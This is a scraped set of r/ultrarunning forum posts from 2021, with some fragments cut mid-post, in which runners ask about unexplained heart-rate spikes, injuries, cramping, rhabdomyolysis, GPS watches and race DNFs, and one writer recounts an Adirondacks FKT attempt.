I've been dealing with what seems to be a cardiovascular issue that comes on suddenly during occasional runs (as in a couple times a year, but is now happening more frequently and intensely) and have seen 3-4 different doctors and specialists over the past several years, and they've turned up nothing and haven't been able to help. So I want to request as much testing as possible beyond a blood panel at my next appt with a new doctor. I've already had lung and asthma testing, full allergy panel, ekg, and blood panel - none have turned up any conditions.

A little background: I'm training for a 100-mile race in a couple months and had my most extreme case of this issue this weekend on a long run (~26 miles) at high elevation in the mountains. The elevation, terrain, some fatigue and the heat no doubt all factored in, but nothing about this run was beyond what I'm used too.

The issue (short version): occasionally during runs (not necessarily long or hard runs) I get to a point where my heart rate spikes significantly while going uphill, even at a slow pace on moderate grade. It got to a point this weekend where I had to sit down and lay down on the trail multiple times before continuing on (which has never happened before). Legs and the rest of my body were completely fine, but my heart rate spiked so high and my lungs felt so tight that I couldn't catch a breath, and I felt this overwhelming sleepiness. I felt like I could have gone to sleep right there on the hillside. Other issues were nausea, dizziness, blurry vision and some shakiness in my hands that was fixed by taking some electrolyte tabs.

This is a very condensed version of it, but it's happened several times now and does not seem to be directly related to anything like elevation, training volume, length of run, overall fitness, etc. No doctor has yet turned up anything. Again, not looking for medical advice, diagnoses, etc. I'll be seeing a Dr again and am looking for tests to request related to cardiovascular or other issues related to ultrarunning and training.

TLDR: heart rate spikes significantly occasionally on runs to a point that causes dizziness, nausea, blurry vision, and sleepiness. Not directly related to fitness, type or length of run, or any other factors that I can identify. What medical tests do I request from the Dr beyond blood panel, allergies and asthma?",ultrarunning,1626025007

Injury question,"Injury - 6 weeks after 100km and still can’t run over 4 miles

So 6 weeks ago I ran 100km road ultra. I mainly run on trails but due to lack of events I gave this a go. Finished it and was in a bit of pain but nothing major, assumed just normal wear and tear.

A few days later and the pain and uncomfortableness was mostly gone. I ran 10 days after and had to stop after 4 miles due to pain around and in my left knee, (on the left side of it and round to the back of the knee). I’ve been getting physio and they have given my strengthening exercises (single-leg bulgarian split squat, glute bridge walk out and a few others and been doing squats and a few machines in the gym). I don’t seem to have any real improvement as I still can’t run any further and the pain returns if I go over 4 miles. The physio tells me to continue to run 2 or 3 times a week to build it up + the strengthening. Due to lack of improvement..my question is - 

Should I continue to run or would total rest be better?

It is always better to do strengthening work for rehab or would rest be better?

I hate resting but feel like just doing nothing for 2 weeks might be worth a go as I feel I'm getting nowhere. I know any answers will be best guesses as there is only limited information but any help/experience is really appreciated!",ultrarunning,1625989811

Looking for watch to replace dead 735XT,"Hello! 

So, my 735XT died after slightly over a year of use, and of course garmin told me (very politely) to suck it up and buy a new watch. So I'm looking for a watch to replace it, preferably not garmin.

==Things I need (I'm assuming things like GPS tracking, a bunch of basic data fields and so on are already in):

\-48h battery life in GPS mode with HR sensor on (Want to use it for at least 5 years and the battery on these things degrades ridiculously fast. This will let me do \~100 milers 6-7 years from now, which is what I expect the watch to last). I would settle for less if the watch keeps the HR sensor on while charging.

\-Solid construction. The 735 \*looks\* solid but I'm really disappointed on it. I want something that lasts. 

\-Good enough software platform (I know this is a pipe dream, but garmin connect is so unstable that I'll take literally anything else as long as I have a way of transferring my data)

\-Wrist HR sensor (Bonus points if it works better than the one in the 735. The bar is pretty low)

==Nice-to-haves:

\-Multisport. If not I'm OK stopping/starting activities, I don't care about this that much.

\-Inline skating, climbing, other profiles available. On the 735 I had to manually edit all activities that weren't on a very short list every time and it got very annoying very fast. 

&amp;#x200B;

I'm kind of cheesed off at the current state of gps watches, tbh. The only thing that matters is the dang battery life, and whenever they upgrade that they put so many useless gimmicks in the things that the battery drains faster and the watch ends up struggling to last for an entire long run after a year or two. I've been looking at some of them and they put a music player in some models. A FRIGGIN MUSIC PLAYER. Sick of being skinned for a tool I need for training, I wish someone made a basic running watch with a huge-ass battery and zero gimmicks. 

Anyway, sorry for the rant, and thanks in advance for the replies. I'm assuming my options will be very limited...",ultrarunning,1625868912

"first ultra, 51 miler 8 weeks after marathon","Hey all, 

I plan on running my second marathon in mid january. I'm averaging about 25-30 mpw with the summer humidity in the south right now. I'm doing a lot of short runs, with the longest being around 7-8, easy runs are around 10 minute miles, tempo and workouts I do in the 8-9 ranges.

I Intend to crank up the volume to around 40-50 mpw  for preparing for the full. My first marathon I didn't have a high enough volume (peaked at 35, Higdon novice 2) and bonked very hard around mile 20, coming in at 5:09.

There's a 51 mile ultra road race in March, about 8 weeks after the full that I really wanna try and do. It has a 12 hour cutoff. Would programming for the full be about on par with what I should do for a 50 miler.

Saloman XA 25 - adjusting the fit,"as anyone run with a loaded XA 25 and found that it needs more hooks on the sternum? 

It comes only in S/M or M/L and I’ve gone with the smaller one but it’s still slightly too big - figure if I can hook to the top and bottom of the 6x tiny loops on the sternum joint (instead of hooking to the 2 x mid-way loops - which is the only option allowed on the pack ATM due to the hook being immovable) then it might feel more secure and less buoyed out from my upper back as is currently the case

Also - anyone tried to modify this pack yet in terms of a snugger fit for smaller torso ppl ? 

Thanks all!

Oh - and I can offer advice about the Fastpack 25 vs XA25 question 

I bought both to try - S/M in both but the UD pack fits much better than Saloman in this size. However the UD seems to jolt around more than the S. Also - huge design flaw with the UD is that the bladder goes inside the pack meaning that u actually have to unpack the whole bag to refill it! That’s pretty much ruled it out for me - and I’m now about 90% sure I’ll stick with the XA25 despite being a bit too big - and in the hope i can find a way to modify it to better fit without stuffing anything up

Oh other flaw with FP25 is that it has annoying velcro on the main bag closure so yr woollen sleeves or delicate ultra light gear gets snagged on the way in/out 
And it’s front strap storage is awful compared to the XA25

But hat off to UD for making a size that fits a medium sized female body vs Saloman who have (in perhaps a sexist, or at least careless, fashion) made the smallest size too big for most female ultra",ultrarunning,1625559532

I've done numerous marathons and a few 50's, no issues doing 30 miles during training. I'm 61, so age is starting to creep up a bit.

My plan is to run the Daytona 100, but just do the 50 miler in Dec. then start training for the Keys 100 that is in May.

My question is this; based on the timing of the 50, I will have a 2 - 3 week period of basic base training for the 100. Advice on say sitting out a week just walking, take a few days off then jump back in, lower my miles for the 2 weeks and then dive in.

How to get ready for a 40 Miler in two months?,"Hello everyone. I was wondering if some of you might give me a tip or two about how to prepare for my first ultra trail race. The race will be held in September and it runs for 67k (or about 40 miles, right?) and it has about 2150 meters of elevation (7000ft, right ?) . I have done a couple of middle-distance races before, in the range from 35k to a trail marathon. Those races usually had pretty much the same amount of elevation as this ultra, so the climbing is not something I'm worried about. The reason I came to reddit for answers is because I'm woefully unprepared. I have spent the last two months studying for Uni, barely leaving the house, ever. I know that the training plans and training schedules for these kind of races take at least 10-12 weeks, and I have 8. In the meantime, I have already singed up for some shorter races (a 35k, a 21k, a 5k, and a vertical K), all of which are trail races, and I intend to use them as training, not flat-out racing. Every single piece of advice would be welcomed, weather it is on weekly mileage, the training intensity, core work, etc. I hope you all are  healthy and enjoying the days out! Thank you!

Exercise-induced hematuria,"Greetings all.

Let's talk about pee for a minute if you don't mind. I hope there are no weird formatting things with this as I am posting on mobile. 

Today, after dropping out of a 50k with significant vert in high temperatures, I experienced what I briefly suspected to be exercise induced hematuria. According to [this article](https://www.sportsmedtoday.com/exerciseinduced-hematuria-va-116.htm), this condition is also called ""runners bladder."" A quick search of the sub finds no discussion of this condition that apparently affects us on the reg.

I discovered this condition during a frantic Google search after the darkest pee of my life. My first thoughts were something serious, but I have no other symptoms and generally feel fine, all things considered. From my understanding, if my kidneys were failing or other serious condition, I would be experiencing dizziness or confusion and likely wouldn't be able to post on reddit or type this up. Until I dove down the dark brown urine rabbit hole, I had never heard of exercise induced hematuria and I'm wondering if anyone has experienced this.

For what it's worth, I dropped because I threw up a few times and really didn't feel like gutting out nausea while trudging up the mountain again for the last ten miles. With the coloration of my urine, clearly this was a good decision. If you're curious, I peed only once about an hour and a half into the run and dropped about 6 and a half hours in. My next pee was the dark brown urination about an hour after I dropped. Now, about two hours post initial panic, urine is back to stereotypically healthy color. 

It's much more likely that I am/was just abnormally dehydrated, but, usually, I get a massive headache when I'm severely dehydrated. No headache today plus this is an interesting medical condition I've never heard of that I'm curious about. 

Has anyone experienced exercise induced hematuria? What was it like and how quickly did it clear?",ultrarunning,1625362964

Hamstring late in a run?,"Curious if any of you have experienced this. About 10-12 miles into my runs, I’ve been dealing with my right hamstring tightening up like crazy. It’s been going on since I experienced major cramping in a 50k in early may (which I did end up completing). Feels achy on my forward drive phase, much worse if I’m going uphill. And the idea of sprinting at that point feels like I’d pull something. I can shorten my stride and be ok. Just did a 17er two days ago but couldn’t have gone much more. 
My question- does something like this strike you as injury or weakness? In other words, is rest what’s needed, or strength training (obv both to some extent)? Feels like it must be weakness because it doesn’t bug me in early miles… yet Just 8 weeks ago I was completing 20+ mile runs regularly without a problem around 8 min/mi pace (so that would pointing to this being injury). I know best advice is to talk with a professional but I’m interested in other anecdotal hamstring experience from ya’ll. Thanks.",ultrarunning,1625237310

My current strategy is to get the proper fueling and hydration, along with a run walk combination of run 1-2 laps and walk 1 for the whole duration. I plan of cycling two shoes every 20 miles.

Dealing with a DNF at Western States,"Hey all,

First time attempt at WSER over the weekend and it didn't go well.  Looking to vent and maybe get some advice.  Was going OK through mile 45, then it all fell apart for a variety of reasons.  The climb up to Devil's Thumb had me delirious.  I looked at my phone and forgot where I was.  That made me worried for my safety.  

I was worried about that happening again and falling off the trail and dying! Even after ""recovering"" at the aid station at the top of the hill, I couldn't get that thought out of my head.  When I got to the bottom (mile 52) at the next aid station, I sat for about 30 minutes, came very close to dropping because I knew it was a big climb to the next spot. An angel at the aid station convinced me to walk out with her.  

Quickly passed her, made it to Michigan Bluff in the dark, got a pacer, but still couldn't get out of my bad headspace.  Instead of running, I was just complaining and walking.  Made it to Forest hill as they were blowing the airhorn which ended my race.

Looking back, I'm so frustrated.  My legs were fine.  My body was fine.  I still moved through 15 miles and 3 aid stations after mentally quitting at 47.  I absolutely could have made it to Forest hill and onwards, but I just couldn't mentally convince myself to keep going.  Yes, my fear at the time was valid, but I should have been able to move past it eventually.  I was not prepared for the heat &amp; hills of the day.

I was feeling too tired and that sounded a reasonable decision. I was scared about having to keep walking for 6 or more hours. 

Now, two days later, I am a bit frustrated. I am realising that it probably was a mental breakdown, I still had plenty of time to recover and then finish (I had like 5 hours before cut off). I am now physically way better I was expecting after running 95k and I feel my training was OK.

Western States Origin Story,"Western States 100 runs this Saturday. The carefully crafted marketing origin story of the race presented by race organizers in the late 1970s was full of over-reaching claims and some concealed facts. In 1974 Gordy Ainsleigh was not the first to cover the course on foot, was not the founder of the race, did not invent trail ultrarunning, and the course was only 89 miles.  But those early pioneers did make huge contributions to the existing ultrarunning sport and its future.

"Downhill speed, training and fatigue.","In my build-up to R2R2R (11k ft. of vert) in April I did a lot of vert. Not just hilly runs, but also about a dozen workouts at a continuous 3900 foot climb and descent. At the canyon, my legs started to fail with about two miles left of the final climb. Failure mode wasn't quads...as is often cited as a result of downhill work. My hamstrings cramped up.

The next day (and days) I had no DOMS in my quads, or anywhere else. Just fatigue that took the usual week or so for recovery.

My question is...is the lack of DOMS in my quads some evidence that I trained properly for the downhills? And perhaps also paced them right? The legs gave out more in hamstrings and glutes. But it's always hard to tell what was driving that late-day fatigue.

When do you know to take a self imposed break?,"For context, I have been running on and off for a few years but probably more seriously the last 18 months. In that time I have done two marathons and my first 50k a week ago.


My 2nd marathon was part of my training. It went really well, but since then, it’s felt a bit of a mental and physical slog. I’m enjoying my runs less, I had a few niggles and injuries leading up 


I don’t do any other fitness work. I am also a trans woman on HRT and have naturally lost a lot of strength. So depletion of strength/tempo plus upping mileage feels like it is making everything mentally and physically harder 


There is a 50 miler in 7 weeks I am tempted to do, and then take a long break, focus on gym work, try something new and try get some of my strength back, with maybe a low weekly mileage of 20 miles a week to stay ticking over

Trying to be a more supportive friend to my ultra runner bff,"Hi all, I'm looking for a little advice for how to be a better supportive friend, and/or balance my worry with encouragement! This is about my best friend and roommate.

A little over 2 years ago my roommate M (23F at the time) got into ultra running. Since then she has run 3 official 50ks, a 50 miler, 100k, 24hr race, and she just completed a 12 hr race this last weekend. She has placed in some of these, and done generally well in others. She is a strong runner and very mentally tough, and I'm impressed by her perseverance and general character. She is used to getting called crazy for her interest in ultras, and I have made an effort to understand her and not call her crazy. I have gone to every one of her races and crewed her, and I paced her for a few laps this last weekend. I feel invested in her running and want to see her succeed. I'm a casual runner, never gone more than a half marathon myself.

However, after training for her 50 miler she began struggling with shin splints and has not found a great permanent solution (she has tried PT but doesnt really stick with it). For the last 6ish months she has geared her training back quite a bit, trying to give her legs a break. It seems to have worked, as she ran a marathon, half marathon, and 12hr race (56 mi total) within the last 6 weeks with no shin splints. However, she did NO training for these (no idea how she did well in these races, but happy for her anyway). 

She will be training for a 100 mile race coming up in September, but I am worried for her. I want to believe that she knows her body best, but I have watched her take 6+ ibuprofen on consecutive days when she has runs to try to control the shin splints. She is not totally honest with her coach about the pain because she wants to be strong and push through. 

Over the last few weeks I have started feeling like a nag. I have been discouraging her from signing up for more races in the summer, and I am scared that she will hurt herself again in the training for this 100 mi race. She is inspired by her ability to push past her mental limits, but I'm worried that she is going to find a physical limit she cant push by that will cause lasting damage. 

Sorry for the long post, but I find context here relevant. Do any of you have advice on how to stay supportive? Do I just have to accept that it's her body to push hard, and I'm not responsible for her overtraining? Is there any advice you ever received that made you reconsider overtraining?",ultrarunning,1624302495

"Do my first 50+miler on Saturday, did not go according to plan","A combination of being pretty undertrained but also going off far too fast led to hip problems by mile 20, which by mile 22, and an aid station, left me with a horrible decision. DNF or walk (limp) in the next 31miles. 

Mentally I couldn’t bring myself to DNF, so after doing the first 22 in 4hrs40mins I trudged in the next 31 in over 9hrs. I feel crap about the time, and my hip is sore as hell and I suspect may need some rehab. It still felt better than I think DNFing would have. I’d told so many people I was doing it I couldn’t have taken not finishing. But it was not the lovely run I was hoping for. 

I have another 50miler in the calendar, and a 100k, but both next year. But right now I feel pretty low. And I feel like a fraud that I hobbled 31miles out of 53.

I didn't need to go before the start, there were no port-a-potties at the aid stations, and I didn't have any equipment (like TP+trash bag) for a quick trip into the woods.

Complete Beginner. Is a 100 miler a realistic goal?

I’m 32 and I’ve been running on and off for years, I took up running back in 2011. I’m not very fast but really enjoy going long exploring my surroundings. My longest distance is a marathon 5 years ago but since then I’ve mostly struggled with staying consistent with training with two kids and a job that allowed little time for extra stuff aside than family. Right now I’m finally on a more consistent schedule and I’ve started increasing my mileage 10-15% weekly all at aerobic effort. I’m at 20 miles/week and I have no rush to increase mileage. I would really like to complete a 100 miler with my end goal being Leadville. I know just running 100 miles will probably take 2 years of consistent running at which point I could probably try to get into the Leadville lottery but the question is what type of time commitment would I be making to get where I want to? What’s the type of mileage required to accomplish the goal? What’s the economic commitment required if I run mostly local races or in surrounding states?

Anyone run the Vacation Races Antelope Canyon?

The course looks beautiful and the elevation profile looks nice, but I'm concerned about how frequently the word ""sandy"" comes into play.

Are we talking mostly rocks with a fine layer of sand, or are we talking ""at the beach with no water"" sand? I'd be okay with the former, but the latter doesn't appeal to me -- of course running in sand is more difficult but I also have a personal thing about getting sand in my shoes and can't imagine how much that would drive me crazy over the course of 80km.

"Ultra Running - Training volume needed for ""beginners""?","Hi, 

&amp;#x200B;

I think many myself included are a little in doubt about how much training is needed to have a decent result in longer running races, so hopefully we can have a good discussion around that here!

&amp;#x200B;

Background: So I somehow signed up for a 60km ultrarun (mostly trail), end august leaving me 10 weeks exactly from now! (have done IMs in the past, but current fitness is not good, running around 20km a week!)

&amp;#x200B;

I have however no idea about how much training is actually needed to have a good experience (goal would probably sub 7h). So looking for some experience that others hopefully can use too. Is volume the most important or is it most important to hit some of those longer runs?

&amp;#x200B;

What is a realistic weekly training volume/number og sessions?  

Does it make sense to do speed work/tempo when not being competitive?  

Any good recommandations for trainingsplans for e.g. 50km?

Thanks all!",ultrarunning,1624004499

Help me pick a watch (I can't decide),"I am training for my first 50k and plan to run several ultras in the next few years as well as shorter races. I run 5 days a week now averaging 30-40 miles or so and wear my watch all day and take off normally at bed. 

I don't care about smart phone notifications, I use the watch for running only and the occasional bike (1-2 x a year lol) 

I currently have a Garmin 235 and it did great for 2 years but lately the battery has went to crap, Garmin is sending me a refurb now but that's kind of upsetting.

I am currently looking between the Garmin 945, Fenix 6 pro sapphire, and the COROS Apex Pro. Money is not an issue for these three. 

The battery life and trail running and backlight for night running make me want to give COROS a try. Garmin hasn't been bad to me but I want a watch that lasts longer between charges and longer over all. I do kinda hate leaving behind all the data from my Garmin with over 4500 miles racked up on it.. anyway. Help me out please.

Brazil 135,"Howdy folks!

In January I'll be running the Br 135 which will be my first overnight and 100 mile event. Actually, besides virtual races during covid-19 times my first ever proper race. Up until now I've done fatass self supported silo stuff mostly.

I'm familiar with the course (i hiked it this year) but my two concerns are sleep (should i? Should i not? When where how long etc) and running at night (worried i won't be able to see well enough on steep downhills) and planning eating. I will be uncrewed. I have a coach based in the states who did the hike with me this year so he knows the course and we will make a plan but once we start it'll be on me to get it done.

I guess the point of the post is looking for any tips or advice as well as resources to look into to best prepare myself. I've got seven months to get ready.

I've done a few 100ks but nothing over that and my target finish is sub 48hrs",ultrarunning,1623970319

I have a 70 mile race planned for next summer, June 18th. It doesn't have much elecation, and other than the distance it's really not a very hard race. However, there's a 100k happening about a month earlier on the 14th may, with ~2500m of climbing across the route that I'd really like to enter.

"Knee pain, suspected cartilage issue, probs a muscle imbalance problem with overtraining. How to fix an imbalance without a pt? Please help me, I'm really struggling.","Tried doing over 50 mpw too fast. Now both my knees hurt and have done for three weeks. Can't see a PT or doctor at the moment. They hurt whenever I try running, and will hurt when sat down.

I'm hoping it is a cartilage issue, apparently a variety of runners knee where the cartilage softens and might need six week to heal. This theory of mine is strengthened by the fact the pain doesn't seem to be localized, it seems to be inside the knee but across the whole cross section of the knee, which is pretty much where cartilage is.

The knee tracks out of alignment with muscle imbalances and this can cause issues with healing apparently.

How do I diagnose a muscle imbalance between glutes, quads, hamstrings? 

Then once I've diagnosed that, Ill just start doing the proper exercises. So I just need help with figuring out that muscle imbalance.

I know this kinda sounds like asking for medical advice, but as I said before I can't get a PT or doc at the moment.

I love running..more than most things. I've waited all year for  summer and now I can't use it. I'm more angry, sad and depressed than I've been in a long time, and it all started with me just trying to better myself . Please help me fix this problem. Thanks.",ultrarunning,1623948625
Poles yes or no,"So I used poles on my first 100 miles finish. Never been a fan of them but with 6000+ meters of elevation I figured I had to. In the end I really think they made the difference and saved my legs a whole lot.

Now I want to try another 100 miles in a couple of months with a little less elevation (4500m) and I want to do it without poles.

I mean I like poles during climbing. Not only physically but especially mentally. When you have yet another climb and your legs are already very tired it's great that you have some support from your poles. Without poles I don't look forward to climbing, with poles I really don't mind.

However, I do like the 'free running' experience without poles. Have your hands free, especially during descent or technical parts my poles tend to get in my way. Plus the terrain here goes from climb to descent all the time so I really don't have time to constantly retract my poles, put them away and then 5 minutes later I need them again. Also I think poles make you slower overall.

I wonder if people here did long distances with and without poles and could share their experience.",ultrarunning,1623938423
Training and weight gain,"27f Does anyone else experience weight gain during training? I stayed at the same weight while marsthon training, but now that I've started ultra training, I've been gaining weight. 

Yes, I'm eating more (about 2200 cals/day 50%carbs/30%protein/20%fat). This is probably the most I've ever ""allowed"" myself to eat due to past eating disorders. Its really hard to see the weight gain on the scale but still try to rationalize that I need this food for fuel. And obviously, as training intensifies, I'll need to eat more yet. I think my calories will max out around 2500-2600 at peak training mileage. 

I can see that I'm ""softer,"" but my friend says she doesn't really notice it. Ugh, it's such a mental game. Does anyone else experience this? How do you deal with it? I keep fighting to not cut down the calories.",ultrarunning,1623927347

Looking for help to understand what went wrong during first 50k,"Hey y'all,

This is my first post here and I'm hoping to get some feedback on understanding why my first 50k didn't go as well as I was hoping. I would really appreciate any and all honest feedback!

I ran the War Hammer 50k in central Kentucky on June 12 last week. The course track was a roughly 27k out-and-back for a total of 54k or 33.6 miles and about 4,200 feet of gain and loss. The high temperature for the day was about 86 degrees with 80% humidity for a heat index of about 99 F.

The first 15 miles or so I felt great, and everything was going to plan - I was taking a GU Roctane gel every 30-45 minutes and trying to drink 32 oz water between each aid station (aid stations were at 6 miles and 12 miles). At about 15 miles, I started feeling my calves and groins wanting to cramp - I thought this may have been due to low electrolytes, so I took 2 GU Roctane electrolyte pills and continued. I hit the turn-around in second place after 2 hours and 45 minutes, feeling great in terms of my energy and cardiovascular system, but a bit nervous about the crampy sensations. Actual full-on cramps starting occuring at about mile 19 in my groins and calves, and the heat and humidity became really intense at the same time. This slowed me down significantly, but I came into the aid station at mile 21 in second place with a 10-15 minute lead on third still feeling so-so - like I definitely needed to slow down and get fluids in, but that I would continue running strong after a short break at the station.

This is where things started to go wrong. I took 2 GU pills, 2 shots of pickle juice and drank a small cup of Coke - the latter two I never tried during my training. After about ten minutes at the station, I started walking back on the track, but after about a mile, I got extremely nauseous - stomach hurting so badly that I had to sit down for about 20 minutes, until finally, I puked up every bit of the fluids and calories I put in my stomach at the aid station. It didn't seem like my body absorbed anything from my gut in this window, but I felt significantly better after puking, so I continued on walking the 6 miles to the final aid station. The 32 oz of fluids I had with me was not enough for this distance after purging all the fluids from the last aid station however, and when I tried to get GU's in, these also made me extremely nauseous. The nausea was so painful to the point that my new goal was to simply finish and to not DNF.

Basically no running happened in these 6 miles to the next aid station. Here, a similar situation played out - tried to carefully get some fluids and sugar in, felt extremely nauseous, puked everything up after 15 or 20 minutes. After this, I was actually able to eat a couple bowls of potato chips and drink some water and felt good enough that I set out for the last 6 miles. However, after about a mile, same situation - severe nausea, and symptoms of dehydration or heat exhaustion due to my inability to take in fluids. After a VERY slow 3 or so miles, I puked up everything left in my stomach, and felt marginally better such that I could walk the rest of the way in and finish the race in 9.5 hours.

In my training, I regularly used GU Roctane gels, and never had a hint of nausea from them, and had a multitude of runs in high humidity, but not in the combination of heat and humidity that we were in during this race. I also did not get quite the training I wanted to, due to unexpected life things that came up and multiple injuries that I didn't resolve until about 4 weeks before the race. All my training was on technical, rocky trails with my longest run being 17 miles and 2,000 feet of gain, with 13-15 11-12 mile runs with 800-1500 feet of gain.

If you read this whole thing, thanks! I really appreciate it. Overall, I think the nausea is what destroyed me. Because of the nausea, I was not able to get fluids or calories to absorb from my stomach after about mile 22. What I really want to know is how to learn from this and prevent it, as well as the muscle cramping, from happening in the future. Respiratory and energy-wise I felt great until my stomach started rejecting everything I put in it. Based on the details, do you all have any advice on what I did wrong and how to prevent nausea and cramps in the future? Also, is it possible despite the hot and humid conditions that I could have over-compensated and consumed too much salt? I was thinking this is what could have upset my stomach in the first place, between the salt pills and pickle juice.

TLDR: Ran first 50k, all was going well until about 22 miles in where cramps and major nausea set in. Struggled to walk the last 11 miles of the race due to dehydration and what I suspect was heat exhaustion, because I couldn't keep any food or fluids down whatsoever. All advice appreciated.",ultrarunning,1623900752

I will take a Clif bar or 2 in case I need them and there will be well stocked aid stations for extras. I have tried the gels I am using in training and haven’t had any issues (yet…). However, I don’t typically eat or drink during runs except when I was testing the gels so I’m not sure when I should start taking on calories.

Rhecovering from Rhabdo - any insight?,"Curious to know if anyone has any knowledge to drop about the outlook for someone recovering from a case of exertional Rhabdomyolysis.

&amp;#x200B;

On Saturday, after an abnormally busy Spring, I got a little over-excited on my first big day out in the mountains for the season. I had been running a decent amount (60 mpw) but mostly on roads. 35 mountain miles and 18,000 ft of climbing later, I landed myself in the hospital with a case of Rhabdo. I was only in for about 24 hours of IV fluids, and am out now, feeling mostly normal, just a little tired, legs are a little sore, etc. 

&amp;#x200B;

I know the proper place to ask questions about this is with my doctor, but doctors tend to be more concerned with things like kidney function than running performance. So my question is this: from a running perspective, what should I expect the recovery to be like? Is it just a matter of waiting until running feels okay and then easing into it based on feel? Or do I need to be super-duper-extra-careful? Or should I expect that all my muscles tissue is dead and returning to running is going to be a slow and discouraging process? I haven't really been able to find a concrete answer to what exactly will happen to my muscles after the enzyme levels return to normal.

&amp;#x200B;

On a related note: After the Rhabdo symptoms go away, do I still benefit from the rather large training stimulus? Or do I miss out on any strengthening because I crossed a certain threshold of destroying my muscles?

Cramping,"Just finished my first ultra, a 50k with ~3,500ft of elevation.

I’ve been training pretty hard (I think), 40-45mpw, at least 5,000ft per week, and did a 27 mile run with 4,700ft a month ago, so I thought I could do it.

During my race, I got leg cramps so badly, worse than I’ve ever experienced. I was in pain the whole time and honestly, it took all the enjoyment from the race.

Luckily, I finished at my bare minimum pace I set for myself, but honestly was expecting to do a lot better. I’m actually pretty bummed. 

I tapered my runs and didn’t run for two days before the race. I hydrated, ate typical food, and electrolytes.

I drank a lot of water (two glasses with nuun tablets) before the race. Is overhydrating a thing? I sweated more in the first 10 miles than I think I’ve ever sweat before. The weather was cool and cloudy and not a factor.

I don’t normally take in a ton of electrolytes during running, because I’ve just never felt cramping. Usually cramps are a day later in the form of tight/soreness. This race, I was trying everything they had at the aid stations, pickles, salt tabs, electrolyte mixes. I think they helped me survive, but damn I’m just so upset with myself.

I’m so happy I did the race and I’m really grateful for the opportunity, just feel like I let myself down. I wasn’t sure I wanted to sign up for another ultra after this one (wanted to stick to half marathon trail races for a while), but now I feel I have to, just to prove to myself I can.

First 25/30 was calm, tunes going strong and but for some pretty painful gooch chafe (sorry for tmi) I was going good, manageable pain until 40 miles and that’s when the pain tolerance test really begun. My legs could do it, it was just getting through the pain for the last 3 hours, in some deranged way I loved it, I almost loved that I hated it. All in all finished in 14 hours 40 minutes with one practise marathon walk behind me and had a beer in my hand 1 minute after finishing.

"Not-race report: Cold River Loop FKT (Adirondacks, NY)","**Background**

I was a D1 walk-on college runner wayyyy back in 2006, but never really ran seriously in the decade or so prior to COVID shutdowns recently aside from random sign-ups for 10K's here and there that never really means sustained mileage or training. When my preschool (teaching job), gym, and other hobbies all got wiped away in March 2020, though, I figured... why not?

I had some solid enough residual speed from general fitness -- got a 21:XX 5K TT a few months in as well as a 1:53 HM. Aside from some trial-and-error to figure out how the hell to run through the freezing cold and pitch black darkness that defined our Syracuse winter, I kept logging miles and improving at various distance TTs as I rolled into 2021; by April of this year I had an 18:XX 5K, 1:25 HM, and was consistently running 70 miles a week.

Then the ultra bug bit me. I saw a local trail 50K with open spots for the middle of the month, not even two weeks out -- hey, why the hell not. I ran [3:59 in the race](https://www.reddit.com/r/running/comments/mtb87r/first_50k_ultra_35930_with_an_asterisk/), but made an early navigation flub and got DQ'd from the results. Still, tons of fun and super happy with the result. The next closest not-waitlisted ultra I could find was over in Long Island in May -- that one turned into a [slower 4:45 over some rough roots and stair stretches but much more successful result at first overall](https://www.reddit.com/r/ultrarunning/comments/n8ecbh/greenbelt_50k_on_long_island_1st_overall/), earning me free Salomon trail shoes and a chunky plaque. 

As June approached, no nearby races really fit with my schedule, so I turned to the trail descriptions of FKT. I bought a Salomon chest pack and tried it out on an [unsupported marathon-ish length run in the Winona State forest](https://fastestknowntime.com/route/winona-state-forest-ny), with some navigation and new pack hiccups slowing me down a bit from a quicker goal but still doing enough to earn the FKT by just under 15 minutes.

**NY/NE mountains**

I grew up in Portland, Oregon. I was never really a trail *runner*, but I'd done plenty of day hikes, a little backpacking, paved and gravel biking over big mountains, some winter skiing... lots of time up in Mt. Hood and the Cascades. Mountains? Cool, I like mountains.

Then I got to Syracuse. Shortly after moving in, wife and I planned a 3-day trip to NH's White Mountains, one of the seemingly more recommended options in our greater area. And it suuuuuuuuuuucked. Waist high (or worse) rock scrambling defined basically every single substantial climb. When you weren't doing that you were very often walking down a literal creek bed, either dry and made up entirely of basketball-sized rocks, or still full of running water. Gross.

We try a couple Adirondack options, slightly closer to us, and find basically the same thing. Well, shit. I guess we're city people now, with occasional dalliances to small, non-mountainous parks and forests.

**The Cold River Loop**

The breaking point that had both of us saying, *lol fuck no*, to coming back to the Adirondacks actually happened on some of the same trails that made up my FKT attempt last June. I'm pretty sure I thought and said I was never coming back... but... that was before I found out I could have my name published on the internet! Fame, fortune! My wife rolls her eyes when I tell her where and what I'm gonna be doing for my next big run.

Also, the loop skips the mountains themselves -- from what I'm readying it's 29 miles with ballpark 2,500 feet of elevation, divided into three manageable climbs and some smaller rollers. So I won't have rock scrambling... just plenty of little and medium ones. The current fastest time is 5:36, just about 11:30/mile pace -- I figure I can knock an hour or so off that, right? Right?

It's hot as fuck and disgustingly humid in Syracuse the week before my trip up there, but forecast for the trailhead area looks much nicer. I figure out how to mount a 1.5L bladded in my small Salomon pack (on the last FKT I'd used a 1L flask in the back and it sucked to swap/refill mid-run), pick up my usual snacks, buy some 100% DEET spray, and take a vacation day off of teaching to wake up at 5:15 and start my drive up north.

**lol, pace**

The first mile of the day is +290 feet elevation or so -- just about the toughest of the day, but relatively smooth surfaces and fair stuff. I come through in 9:44 and think, OK cool, nice and easy and I can drop down to my long run pace (8:00-8:30) on some of the easier miles. My pack with 2.5L of total fluids and some miscellaneous crap is heavy but fitting comfortably. There's some little rocks, roots, and stream crossings breaking up my flow but I get to \~10K at about 9:30 pace, right around what I'd need to do to beat the current time by a full hour.

Then there's the first big swamp. I tip-toe across branches that other visitors have draped across the muck, losing a minute or two, and then get a sustained climb as a reward afterwards. Next mile split comes in 11:50, hmph. And the trail is starting to get increasingly overgrown -- I'm catching spiderwebs in the face and all sorts of bush and tree branches to the shins and forearms. Hmph.

**Bushwhacking**

And the overgrowth only gets worse when I diverged from the ""main"" mountain ascent route. I keep hoping that the various plants I'm running through are only growing *into* the trail so I can successfully plow through them, which thankfully turns out to be true. But it's still rooted and rocky under the thick brush cover, only now I can't reliably see it -- so on a mostly downhill stretch from mile 12 through 16 I start splitting 12's and 13's, with more power-walking than true running.

I'm staying upright at least, with this cautious approach. Did I mention I'm miles away from cell coverage and I have no idea if anyone else is going to cross through this trail today (or tomorrow, or the next day)? Safety absolutely takes priority over pace. One benefit (well, the only benefit) is that I'm still feeling very fresh -- when the trail does start to clear up a bit, I easily shift back into low 9:00 pace for miles 17 and 18.

**Thou shalt not hurdle at mile 25**

